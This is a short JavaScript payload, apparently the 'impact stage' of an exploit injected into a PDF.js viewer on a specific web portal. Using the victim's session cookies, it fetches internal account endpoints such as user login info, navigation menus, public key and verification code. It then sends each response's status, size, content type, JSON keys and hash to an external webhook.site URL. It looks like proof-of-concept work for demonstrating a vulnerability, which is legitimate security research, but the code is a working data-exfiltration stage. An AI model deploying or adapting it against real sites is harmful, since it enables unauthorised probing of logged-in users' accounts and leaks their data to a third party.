
console.warn("PDFJS_IMPACT_STAGE_FROM_JSDELIVR_EXECUTED", self.location && self.location.href);
(function(){
  var webhook = "https://36.webhook.site/80f0e3ea-047f-4cc9-85d0-135e41459ca3";
  var endpoints = [
    "/igi/orion-platform/static/js/pdfjs/web/viewer.html",
    "/igi/client-portal/",
    "/sys/user/getUserLoginInfo",
    "/sys/menu/nav",
    "/user/getPubKey",
    "/user/getVerifyCode"
  ];
  function enc(v){try{return encodeURIComponent(String(v));}catch(e){return "enc_error";}}
  function fnv1a(s){
    var h=2166136261;
    for(var i=0;i<s.length;i++){h^=s.charCodeAt(i); h+=(h<<1)+(h<<4)+(h<<7)+(h<<8)+(h<<24);}
    return ("00000000"+(h>>>0).toString(16)).slice(-8);
  }
  function topKeys(t){
    try {
      var j=JSON.parse(t);
      if (j && typeof j === "object") {
        var obj = Array.isArray(j) ? (j[0] || {}) : j;
        return Object.keys(obj).slice(0,20).join(",");
      }
    } catch(e) {}
    return "";
  }
  function hit(stage, params){
    try {
      fetch(webhook+"?stage="+enc(stage)+"&"+params, {mode:"no-cors", credentials:"omit", cache:"no-store"}).catch(function(){});
    } catch(e) {
      console.warn("PDFJS_IMPACT_WEBHOOK_ERR", e && e.message || String(e));
    }
  }
  function probe(url, idx){
    fetch(url, {credentials:"include", cache:"no-store"})
      .then(function(r){return r.text().then(function(t){
        var ct="";
        try{ct=r.headers.get("content-type")||"";}catch(e){}
        var keys=topKeys(t);
        var hash=fnv1a(t.slice(0,4096));
        console.warn("PDFJS_IMPACT_SAME_ORIGIN_PROBE", url, "status="+r.status, "len="+t.length, "ct="+ct, "keys="+keys, "hash="+hash);
        hit("same_origin_metadata", "idx="+idx+"&url="+enc(url)+"&status="+r.status+"&len="+t.length+"&ct="+enc(ct)+"&keys="+enc(keys)+"&h="+hash);
      });})
      .catch(function(e){
        console.warn("PDFJS_IMPACT_SAME_ORIGIN_PROBE_ERR", url, e && e.message || String(e));
        hit("same_origin_metadata_error", "idx="+idx+"&url="+enc(url)+"&err="+enc(e && e.message || String(e)));
      });
  }
  hit("impact_stage_loaded", "origin="+enc(self.location && (self.location.origin||self.location.href)));
  endpoints.forEach(function(u,i){probe(u,i);});
})();
